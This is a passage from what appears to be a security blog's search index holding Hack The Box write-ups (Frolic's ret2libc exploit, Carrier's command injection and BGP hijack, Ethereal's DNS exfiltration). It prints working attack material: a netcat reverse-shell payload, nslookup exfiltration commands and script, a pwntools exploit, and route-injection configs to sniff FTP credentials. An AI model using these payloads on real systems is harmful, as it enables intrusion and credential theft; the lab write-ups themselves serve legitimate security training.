            : PartialNX is enabled so we won‚Äôt be able to execute a shellcode on the stack. But first things first, let‚Äôs find the offset for our overflow:root@ragingunicorn:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 128Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1AeWhen we crash the program, we see EIP is set to 0x62413762:We find the offset at position 52:root@ragingunicorn:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762[*] Exact match at offset 52Next, we‚Äôll look for gadgets in libc that we can use in our exploit. We‚Äôll copy the libc file from the box to our own machine and use one_gadget:root@ragingunicorn:~/frolic# nc -lvnp 4444 &gt; libclistening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.111] 59480root@ragingunicorn:~/frolic# one_gadget -f libc rop0x3ac5c execve(\"/bin/sh\", esp+0x28, environ)constraints:  esi is the GOT address of libc  [esp+0x28] == NULLWe found a gadget at 0x3ac5c that‚Äôll give us a nice shell!We also need libc‚Äôs base address (which doesn‚Äôt change since ASLR is disabled):www-data@frolic:/home/ayush$ ldd /home/ayush/.binary/ropldd /home/ayush/.binary/rop        linux-gate.so.1 =&gt;  (0xb7fda000)        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)        /lib/ld-linux.so.2 (0xb7fdb000)Base address is : 0xb7e19000To construct the final exploit, we write a simple script that‚Äôll squash the $RIP register with the memory address of the gadget that spawns /bin/sh:from pwn import *payload = \"A\" * 52 + p32(0xb7e19000+0x3ac5c)print payloadWe can run the exploit locally to generate a payload file which we then transfer to the target system and pipe into the target binary:www-data@frolic:/dev/shm$ /home/ayush/.binary/rop $(cat payload)/home/ayush/.binary/rop $(cat payload)# cd /rootcd /root# cat root.txtcat root.txt85d3fd..."
  },
  
  {
    "title": "Carrier - Hack The Box",
    "url": "/posts/htb-writeup-carrier/",
    "categories": "hackthebox, infosec",
    "tags": "networking, lxc, containers, bgp, command injection, php, snmp, mitm",
    "date": "2019-03-16 00:00:00 +0800",
    





    
    "snippet": "I had the idea for creating Carrier after competing at the NorthSec CTF last year where there was a networking track that required the players to gain access to various routers in the network. I th...",
    "content": "I had the idea for creating Carrier after competing at the NorthSec CTF last year where there was a networking track that required the players to gain access to various routers in the network. I thought of re-using the same concept but add a MITM twist to it with BGP prefix hijacking. My initial version was much more complex and had DNS response poisoning in it. I eventually scaled it down because one part required using Scapy to craft packets from one of the container and I wasn‚Äôt sure if it‚Äôd work reliably with hundreds of people on the EU-Free server. I also didn‚Äôt want to lock people into using a specific tool or library from the container so I scrapped that part of Carrier.I tried to make the box somewhat realistic. It simulates some kind of network management &amp; ticketing system written in PHP. There is an online PDF manual that contains the description of some of the error codes displayed on the main page. Like many network devices, it contains a default SNMP community string public that allow users to query MIBs from the device, including the serial number used to log into the system. From there, there‚Äôs a trivial command injection that allow access to one of the ISP router.For the priv esc, I wanted to do something different so I used LXC containers to run 3 different routers, each simulating a different ISP with its own autonomous system number. Normally, ISPs should have policies in place to restrict what routes can be sent from a neighboring ISP. In this case, no such policies are configured and we can inject any route we want from AS100 where we have a foothold. To get the root flag, we need to sniff the FTP credentials of a user connecting to a remote server in AS300. I put a hint for the server IP in the ticket section of the website so people would have an idea what to do.The ‚Äúintended solution‚Äù for this box was to inject a better route in the BGP table to redirect traffic through the R1 router where we could run a tcpdump capture and get the credentials. There‚Äôs a couple of ways to do that but injecting a more specific route is probably the simplest solution. We can‚Äôt just inject the more specific route and intercept the traffic because that same route is re-advertised from AS200 to AS300 and the later will insert the more specific route in its RIB. Even though AS300 is directly connect to 10.120.15.10, it won‚Äôt use the /24 from the local interface but instead prefer the more specific route coming from AS200 and cause the packets to loop between the two routers.The BGP routing protocol defines various ‚Äúwell-known‚Äù community attributes that must be supported by a BGP implementation. In this case, what we want to do is tell AS200 to send traffic to us but also tell it not to re-advertise the more specific route down to AS300. RFC1997 defines some of the standard attributes such as:NO_EXPORT (0xFFFFFF01)    All routes received carrying a communities attribute    containing this value MUST NOT be advertised outside a BGP    confederation boundary (a stand-alone autonomous system that    is not part of a confederation should be considered a    confederation itself).Using a route-map in the quagga‚Äôs Cisco-like CLI (vtysh), we can ‚Äútag‚Äù the routes sent to AS200 with the no-export policy and prevent the upstream router from re-advertising the route elsewhere. We also need to filter out that same route towards AS300 because we don‚Äôt want AS300 to insert the /25 route in its RIB.I think most people solved the box the easy way (nothing wrong with that) by changing the IP address of one of the interface on the R1 container and impersonate the FTP server to catch the connection from the FTP client and get the credentials. That further reinforces the point that not only is crypto important but verifying the identity of the server also is. Using only BGP route manipulation, it is possible to intercept the FTP session without changing any IP on the container.Quick summary  The /doc directory on the webserver has indexing enabled and contains documentation for the error codes on the login page  SNMP is configuration with the default public community string that allow us to retrieve the serial number of the box  One of the error code on the main page indicates that the password hasn‚Äôt been changed and that the serial number should be used to log in  There‚Äôs a hint on the ticket section of the webpage about an important server that we should get access to  The diagnostic section of the web page contains a command injection vulnerability that we can use to gain RCE  From the R1 router (container), we can perform a MITM attack by injecting a more specific route in the BGP table  We then intercept an FTP session and recover the credentials that let us log in as root and recover root.txtDetailed stepsPortscanWe‚Äôll start by the standard nmap and find that there‚Äôs only two ports open on the server.root@violentunicorn:~# nmap -sC -sV -p- 10.10.10.105Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-12 01:46 EDTNmap scan report for 10.10.10.105Host is up (0.010s latency).Not shown: 65532 closed portsPORT   STATE    SERVICE VERSION21/tcp filtered ftp22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: LoginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.09 secondsWeb enumerationThere‚Äôs a login page for some web application (this is a monitoring/ticketing system for a fictitious ISP).There are no default credentials or SQLi on this page.The error codes are interesting but we don‚Äôt know what they are yet (more on that later).Using gobuster, we find a couple of directories:root@ragingunicorn:~# gobuster -w /usr/share/dirb/wordlists/small.txt -t 10 -u 10.10.10.105=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://10.10.10.105/[+] Threads      : 10[+] Wordlist     : /usr/share/dirb/wordlists/small.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 10s=====================================================2019/03/12 01:47:12 Starting gobuster=====================================================/css (Status: 301)/debug (Status: 301)/doc (Status: 301)/img (Status: 301)/js (Status: 301)/tools (Status: 301)=====================================================2019/03/12 01:47:13 Finished=====================================================The /debug directory is just a link to phpinfo()There‚Äôs a /tools directorry that contains a remote.php file but it doesn‚Äôt do anything because the license is expired:Inside the /doc directory there are two files:The diagram_for_tac.png file contains a network diagram showing 3 different BGP autonomous systems (the initial foothold is in AS100).The error_code.pdf file contains a list of error codes:If we cross reference the two codes from the main login page:  We see that the license is now invalid/expired  The default admin account uses the serial number of the device (which we don‚Äôt have yet)SNMP enumerationBy querying the box with the default public SNMP community string, we can find the serial number of the device. This type of information is often found in SNMP mibs on network devices.root@violentunicorn:~# snmp-check 10.10.10.105snmp-check v1.9 - SNMP enumeratorCopyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)[+] Try to connect to 10.10.10.105:161 using SNMPv1 and community 'public'[*] System information:  Host IP address               : 10.10.10.105  Hostname                      : -  Description                   : -  Contact                       : -  Location                      : -  Uptime snmp                   : -  Uptime system                 : -  System date                   : -root@violentunicorn:~# snmpwalk -v1 -c public 10.10.10.105iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: \"SN#NET_45JDX23\"End of MIBThe serial number is: NET_45JDX23We can now log in to the website using username admin and password NET_45JDX23.DashboardThe main dashboard page indicates that the system is in read-only mode since the license is expired.It also indicates that the router config will be reverted every 10 minutes (this is done on purpose to make sure we don‚Äôt lose access to the box if someone messes up the router configuration).TicketsThe tickets section contains a hint about what we need to do once we get access to the router (more on that in the next section)Ticket #6 contains the hint:  ‚Ä¶ one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 networkSo it seems that there‚Äôs something important on the 10.120.15.0/24 network. The ticket indicates the user is using the unencrypted FTP protocol so we‚Äôll be able to sniff the credentials if we can redirect traffic through the router.Diagnostics command injectionBased on the output we see when we click on the Verify status button, we can see that it‚Äôs running ps grepped with quagga. It‚Äôs actually running the command on the r1 router since the web server builds an ssh connection to r1 first then runs the command there.The HTML on the diagnostics page contains a base64 encoded value in the check field:The hidden field cXVhZ2dh base64 decodes to quagga. We can control the grep parameter by modifying the check parameter in the HTTP POST request and gain code execution.For check, we will use the ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f value encoded in base64:We then get a reverse shell using netcat:root@violentunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.105] 48918/bin/sh: 0: can't access tty; job control turned off# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@r1:~# ididuid=0(root) gid=0(root) groups=0(root)root@r1:~# lslstest_intercept.pcap  user.txtroot@r1:~# cat user.txtcat user.txt5649c4...BGP hijackingSo, there‚Äôs a user on AS200 connecting to a server on the 10.120.15.0/24 network (the server is 10.120.15.10, which is the IP address of the lxdbr1 interface on the host OS). We can‚Äôt initially see his traffic because the traffic is sent directly from AS200 to AS300 (we are on AS100).The idea is to inject a more specific routes for the 10.120.15.0/24 network so the r2 router will send traffic to us at r1. Then once we get the traffic we‚Äôll send it back out towards r3 because we already have a BGP route from r3 for the 10.120.15.0/24 networkThere‚Äôs a small twist to this: when we send the more specific route (we can use a /25 or anything smaller than a /24), we must ensure that this route is not sent from r2 to r3 otherwise r3 will blackhole traffic towards the router since it received a more specific route. To do this, we can add the no-export BGP community to the route sent to r2, so the route won‚Äôt be re-advertised to other systems.We can see below that the best route for the  10.120.15.0/24 network is from AS 300 (10.78.11.2):root@r1:~# vtyshHello, this is Quagga (version 0.99.24.1).Copyright 1996-2005 Kunihiro Ishiguro, et al.r1# show ip bgp summshow ip bgp summBGP router identifier 10.255.255.1, local AS number 100RIB entries 53, using 5936 bytes of memoryPeers 2, using 9136 bytes of memoryNeighbor        V         AS MsgRcvd MsgSent   TblVer  InQ OutQ Up/Down  State/PfxRcd10.78.10.2      4   200       4       7        0    0    0 00:00:14       2210.78.11.2      4   300       4      10        0    0    0 00:00:11       22Total number of neighbors 2r1# show ip bgp 10.120.15.0/24show ip bgp 10.120.15.0/24BGP routing table entry for 10.120.15.0/24Paths: (2 available, best #1, table Default-IP-Routing-Table)  Advertised to non peer-group peers:  10.78.10.2  300    10.78.11.2 from 10.78.11.2 (10.255.255.3)      Origin IGP, metric 0, localpref 100, valid, external, best      Last update: Tue Jul  3 03:40:17 2018  200 300    10.78.10.2 from 10.78.10.2 (10.255.255.2)      Origin IGP, localpref 100, valid, external      Last update: Tue Jul  3 03:40:14 2018We‚Äôll change the route-map to add no-export to routes sent to AS200, then advertise the 10.120.15.0/25 network:r1# conf tr1(config)# ip prefix-list leak permit 10.120.15.0/25r1(config)# !r1(config)# route-map to-as200 permit 10r1(config-route-map)# match ip address prefix-list leakr1(config-route-map)# set community no-exportr1(config-route-map)# !r1(config-route-map)# route-map to-as200 permit 20r1(config-route-map)# !r1(config-route-map)# route-map to-as300 deny 10r1(config-route-map)# match ip address prefix-list leakr1(config-route-map)# !r1(config-route-map)# route-map to-as300 permit 20r1(config-route-map)# !r1(config-route-map)# router bgp 100r1(config-router)# network 10.120.15.0 mask 255.255.255.128r1(config-router)# endr1#After changing the route-map, we can issue a clear ip bgp * out to refresh the outbound filter policies without resetting the entire BGP adjacency. We can see now that we are sending the /25 route towards AS200:r1# show ip bgp nei 10.78.10.2 advertised-routesBGP table version is 0, local router ID is 10.255.255.1Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,              i internal, r RIB-failure, S Stale, R RemovedOrigin codes: i - IGP, e - EGP, ? - incomplete   Network          Next Hop            Metric LocPrf Weight Path*&gt; 10.120.15.0/25   10.78.10.1               0         32768 iPacket capture FTP session to the server 10.120.15.10Since we have now injected a more specific route for the 10.120.15.0/24 network, AS200 will send traffic to us (AS100) when trying to reach 10.120.15.10. Then r1 will send the traffic back out eth2 towards AS300.We can sniff the traffic using tcpdump and we see that a user logs in to 10.120.15.10 using FTP, and we can see his credentials:root@r1:~# tcpdump -vv -s0 -ni eth2 -c 10 port 21tcpdump: listening on eth2, link-type EN10MB (Ethernet), capture size 262144 bytes[...]13:53:01.528076 IP (tos 0x10, ttl 63, id 11657, offset 0, flags [DF], proto TCP (6), length 63)    10.78.10.2.50692 &gt; 10.120.15.10.21: Flags [P.], cksum 0x2e03 (incorrect -&gt; 0x75af), seq 1:12\tUSER root[...]13:53:01.528248 IP (tos 0x10, ttl 63, id 11658, offset 0, flags [DF], proto TCP (6), length 74)    10.78.10.2.50692 &gt; 10.120.15.10.21: Flags [P.], cksum 0x2e0e (incorrect -&gt; 0xa290), seq 12:34\tPASS BGPtelc0rout1ngLogging to the server with root credentials and getting the system flagNote: We can log in directly from the HTB network to the box IP with the FTP credentials, but in this example we‚Äôll log in from r1. We have to first enable an interactive pty so we can SSH.# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@r1:~# ssh root@10.120.15.10root@10.120.15.10's password: BGPtelc0rout1ngWelcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage[...]root@carrier:~# lslsroot.txt  secretdata.txtroot@carrier:~# cat root.txtcat root.txt2832e..."
  },
  
  {
    "title": "Ethereal - Hack The Box",
    "url": "/posts/htb-writeup-ethereal/",
    "categories": "hackthebox, infosec",
    "tags": "ms-dos, dns exfiltration, command injection, rotten potato, unintended, efs",
    "date": "2019-03-09 00:00:00 +0800",
    





    
    "snippet": "Ethereal was a really difficult box from MinatoTW and egre55 that I solved using an unintended priv esc method with Rotten Potato. The box was patched soon after the release to block that priv esc ...",
    "content": "Ethereal was a really difficult box from MinatoTW and egre55 that I solved using an unintended priv esc method with Rotten Potato. The box was patched soon after the release to block that priv esc route. The box had some trivial command injection in the Test Connection page but since pretty much everything was blocked outbound I had to use DNS exfiltration to get the output from my commands. Once I got SYSTEM access via Potato, I found user.txt and root.txt were encrypted and couldn‚Äôt be read as NT AUTHORITY\\SYSTEM. At that point, I‚Äôve spent a lot of hours on this box and I just wanted to get the flags so I changed both users‚Äôs password and RDP‚Äôed in and was able to see the flags.Quick summary  Find the MS-DOS password manager file FDISK.zip on the FTP server  Run Dosbox, downloading missing dependies for pbox.exe, retrieve passwords after guessing the secret key  Find the command injection vulnerability on the ‚ÄúPing‚Äù page  Use command injection vulnerability to scan open outbound ports, find TCP ports 73 and 136  Use certutil.exe to download nc.exe on the box, get a shell as user IIS  Use certutil.exe to download Juicy Potato on the box, get a shell as SYSTEM  Disable Windows Defender &amp; Windows Firewall  Change passwords for users jorge and rupal, then RDP into the box to get both user.txt and root.txt flagsDetailed stepsPortscanroot@darkisland:~/hackthebox/Machines/Ethereal# nmap -sC -sV -oA ethereal 10.10.10.106Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-08 13:35 EDTNmap scan report for ethereal.htb (10.10.10.106)Host is up (0.10s latency).Not shown: 997 filtered portsPORT     STATE SERVICE VERSION21/tcp   open  ftp     Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106| ftp-syst: |_  SYST: Windows_NT80/tcp   open  http    Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Ethereal8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  Basic realm=ethereal.htb|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 38.65 secondsFTP enumerationAnonymous access is allowed on the FTP server.root@darkisland:~/hackthebox/Machines/Ethereal# ftp 10.10.10.106Connected to 10.10.10.106.220 Microsoft FTP ServiceName (10.10.10.106:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.Password:230 User logged in.Remote system type is Windows_NT.ftp&gt; ls200 PORT command successful.125 Data connection already open; Transfer starting.07-10-18  10:03PM       &lt;DIR&gt;          binaries09-02-09  09:58AM                 4122 CHIPSET.txt01-12-03  09:58AM              1173879 DISK1.zip01-22-11  09:58AM               182396 edb143en.exe01-18-11  12:05PM                98302 FDISK.zip07-10-18  09:59PM       &lt;DIR&gt;          New folder07-10-18  10:38PM       &lt;DIR&gt;          New folder (2)07-09-18  10:23PM       &lt;DIR&gt;          subversion-1.10.011-12-16  09:58AM                 4126 teamcity-server-log4j.xml226 Transfer complete.We‚Äôll download all the files to our Kali box so it‚Äôs easier to look at files:root@darkisland:~/hackthebox/Machines/Ethereal# wget -r --no-passive ftp://10.10.10.106--2018-10-08 13:38:09--  ftp://10.10.10.106/           =&gt; ‚Äò10.10.10.106/.listing‚ÄôConnecting to 10.10.10.106:21... connected.Password managerThere‚Äôs a lot of files on the FTP, the interesting one is FDISK.zip.First, we‚Äôll unzip it and determine it‚Äôs a FAT filesystem.root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# unzip FDISK.zip Archive:  FDISK.zip  inflating: FDISKroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file FDISKFDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \"MSDOS5.0\", root entries 224, sectors 2880 (volumes &lt;=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x5843af55, unlabeled, FAT (12 bit), followed by FATAfter mounting it, we found there‚Äôs an MS-DOS executable pbox.exe file in there.root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# mount -t vfat -o loop FDISK /mntroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnttotal 1drwxr-xr-x 2 root root 512 Jul  2 19:16 pboxroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnt/pboxtotal 80-rwxr-xr-x 1 root root   284 Jul  2 19:05 pbox.dat-rwxr-xr-x 1 root root 81384 Aug 25  2010 pbox.exeroot@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file /mnt/pbox/pbox.exe/mnt/pbox/pbox.exe: MS-DOS executable, COFF for MS-DOS, DJGPP go32 DOS extender, UPX compressedTo run this, we‚Äôll use dosbox and mount the Kali directory inside MS-DOS.root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# cd /mnt/pbox/root@darkisland:/mnt/pbox# dosboxDOSBox version 0.74-2Copyright 2002-2018 DOSBox Team, published under GNU GPL.---CONFIG:Loading primary settings from config file /root/.dosbox/dosbox-0.74-2.confMIXER:Got different values from SDL: freq 44100, blocksize 512ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)MIDI:Opened device:noneWe are missing a dependency to be able to run pbox.exeAfter a bit of googling, I found the missing dependency:root@darkisland:/mnt/pbox# wget http://teadrinker.net/tdold/mr/cwsdpmi.zip--2018-10-08 13:47:19--  http://teadrinker.net/tdold/mr/cwsdpmi.zipResolving teadrinker.net (teadrinker.net)... 46.30.213.33, 2a02:2350:5:100:c840:0:24b2:20fbConnecting to teadrinker.net (teadrinker.net)|46.30.213.33|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 16799 (16K) [application/zip]Saving to: ‚Äòcwsdpmi.zip‚Äôcwsdpmi.zip               100%[=====================================&gt;]  16.41K  --.-KB/s    in 0.1s    2018-10-08 13:47:20 (125 KB/s) - ‚Äòcwsdpmi.zip‚Äô saved [16799/16799]root@darkisland:/mnt/pbox# unzip cwsdpmi.zip Archive:  cwsdpmi.zip  inflating: CWSDPMI.EXENow we can run the password manager, but it asks for a password.The password is easily guessed: password, we now have access to all the passwords.Found multiple credentials; the only one that is useful is: !C414m17y57r1k3s4g41n!Web enumerationThere‚Äôs a ton of useless crap and decoys on this box, notably:  Fake desktop with a troll face &amp; flag  Fake members login pageThere‚Äôs an administration page at http://ethereal.htb:8080/We can log in with:  username: alan  password: !C414m17y57r1k3s4g41n!Note: We can guess the username since the name Alan is mentionned in the notes and in some of the password manager entriesCommand injection using ping pageWe can run commands by adding &amp;&amp; &lt;command&gt; in the command field.We can validate we got RCE by pinging ourselves with 127.0.0.1 &amp;&amp; ping 10.10.14.23.The first IP is implicitely pinged by the script followed by our injected command after &amp;&amp;:root@darkisland:~/hackthebox/Machines/Ethereal# tcpdump -nni tun0 icmptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on tun0, link-type RAW (Raw IP), capture size 262144 bytes14:30:51.029999 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 39, length 4014:30:51.030129 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 39, length 4014:30:52.046783 IP 10.10.10.106 &gt; 10.10.14.23: ICMP echo request, id 1, seq 40, length 4014:30:52.046814 IP 10.10.14.23 &gt; 10.10.10.106: ICMP echo reply, id 1, seq 40, length 40We can‚Äôt run any other commands like certutil.exe or powershell.exe, AppLocker is probably enabled on the box.However we can exfil some data by using nslookup.For example, using the payload 127.0.0.1 &amp;&amp; nslookup inject 10.10.14.23, we get can get the box to do a query back to us:root@darkisland:~# tcpdump -nni tun0 -vv port 53tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes20:20:16.625986 IP (tos 0x0, ttl 127, id 8724, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.52125 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:20:18.652075 IP (tos 0x0, ttl 127, id 8726, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.52126 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? inject. (24)20:20:20.922359 IP (tos 0x0, ttl 127, id 8727, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.52127 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? inject. (24)What we want is to exfil the output of commands, by using the following payload we can start to output some stuff:FOR /F \"tokens=1\" %g IN 'whoami' do (nslookup %g 10.10.14.23)Output:20:30:23.082437 IP (tos 0x0, ttl 127, id 8942, offset 0, flags [none], proto UDP (17), length 58)    10.10.10.106.63713 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? etherealalan. (30)Now, it‚Äôs not perfect, we can‚Äôt exfil special characters or anything else that is not a valid character in a DNS query. So in the query above, we can guess that the real output should be ethereal\\alan instead of etherealalan.So if we‚Äôre listing directories, we have to use the /b flag so it only returns the name of the directory/file otherwise we‚Äôll need to play with the token parameter to indicate which item to read from the output.Another example listing directories: FOR /F \"tokens=1\" %g IN 'dir /b c:\\users' do (nslookup %g 10.10.14.23)20:35:04.531929 IP (tos 0x0, ttl 127, id 9016, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53805 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:06.823075 IP (tos 0x0, ttl 127, id 9017, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53806 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:08.851451 IP (tos 0x0, ttl 127, id 9018, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53807 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:10.839111 IP (tos 0x0, ttl 127, id 9019, offset 0, flags [none], proto UDP (17), length 59)    10.10.10.106.53808 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? Administrator. (31)20:35:12.854740 IP (tos 0x0, ttl 127, id 9020, offset 0, flags [none], proto UDP (17), length 59)    10.10.10.106.53809 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? Administrator. (31)20:35:14.895892 IP (tos 0x0, ttl 127, id 9021, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.53810 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:16.886216 IP (tos 0x0, ttl 127, id 9022, offset 0, flags [none], proto UDP (17), length 50)    10.10.10.106.53811 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? alan. (22)20:35:19.474240 IP (tos 0x0, ttl 127, id 9023, offset 0, flags [none], proto UDP (17), length 50)    10.10.10.106.53812 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? alan. (22)20:35:21.312568 IP (tos 0x0, ttl 127, id 9025, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.56757 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:23.309541 IP (tos 0x0, ttl 127, id 9028, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.56758 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? jorge. (23)20:35:25.299775 IP (tos 0x0, ttl 127, id 9029, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.56759 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? jorge. (23)20:35:27.338241 IP (tos 0x0, ttl 127, id 9031, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.56760 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:29.355372 IP (tos 0x0, ttl 127, id 9032, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.56761 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? Public. (24)20:35:31.523795 IP (tos 0x0, ttl 127, id 9034, offset 0, flags [none], proto UDP (17), length 52)    10.10.10.106.56762 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? Public. (24)20:35:33.646114 IP (tos 0x0, ttl 127, id 9035, offset 0, flags [none], proto UDP (17), length 70)    10.10.10.106.56763 &gt; 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)20:35:35.669198 IP (tos 0x0, ttl 127, id 9038, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.58924 &gt; 10.10.14.23.53: [udp sum ok] 2+ A? rupal. (23)20:35:37.681147 IP (tos 0x0, ttl 127, id 9040, offset 0, flags [none], proto UDP (17), length 51)    10.10.10.106.58925 &gt; 10.10.14.23.53: [udp sum ok] 3+ AAAA? rupal. (23)We just listed c:\\users and found the following directories:  c:\\users\\Administrator  c:\\users\\alan  c:\\users\\jorge  c:\\users\\rupalDoing things manually takes a long time so I started working on a python script to automate the process. Overcast [Blog] was also working on the box and was one step ahead of me. He shared with me a script he had already created.#!/usr/bin/python3from socket import *from requests_futures.sessions import FuturesSessionimport timeimport selects = socket(AF_INET, SOCK_DGRAM)s.settimeout(10)s.bind(('10.10.14.23', 53))def recv():    print(\"[+] Receiving data:\")    try:        while True:            data = s.recv(1024)            if data[1] == 2: # A record                print(data[13:-5])    except Exception as e:        print(e)        print(\"[!] Done\")        returndef send(cmd, col):    session = FuturesSession()    session.post(\"http://ethereal.htb/p1ng/\", data=            {                \"__VIEWSTATE\": \"/wEPDwULLTE0OTYxODU3NjhkZD0G/ny1VOoO1IFda8cKvyAZexSk+Y22QbXBRP0gxbre\",                \"__VIEWSTATEGENERATOR\": \"A7095145\",                \"__EVENTVALIDATION\": \"/wEdAAOZvFNfMAAnpqKRCMR2SHn/4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN/siIFmy9ZoaWu7BT0ak0x7Uttp88efMu6vUQ1geHQSWQ==\",                \"search\": f\"127.0.0.1 &amp;&amp; FOR /F \\\"tokens={col}\\\" %g IN ('{cmd}') do (nslookup %g 10.10.14.23)\",                \"ctl02\": \"\"            },            proxies={\"http\": \"127.0.0.1:8080\"})def shell():    while 1:        cmd = input(\"$&gt; \")        if cmd == \"exit\":            s.close()            exit()        else:            col = input(\"(col#)&gt; \")            if col == '':                col = 1            else:                col = int(col)            send(cmd, col)            recv()if __name__ == '__main__':    shell()We still need to mess with the token parameter when we have output with spaces in it, but it make things but more manageable.whoamiroot@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_alan.py $&gt; whoami(col#)&gt; [+] Receiving data:b'etherealalan'dir c:\\users\\alan$&gt; dir /b c:\\users\\alan(col#)&gt; [+] Receiving data:b'Contacts'b'Desktop'b'Documents'b'Downloads'b'Favorites'b'Links'b'Music'b'Pictures'b'Saved'b'Searches'b'Videos'dir c:\\users\\alan\\desktop$&gt; dir /b c:\\users\\alan\\desktop(col#)&gt; [+] Receiving data:b'note-draft\\x03txt'Too 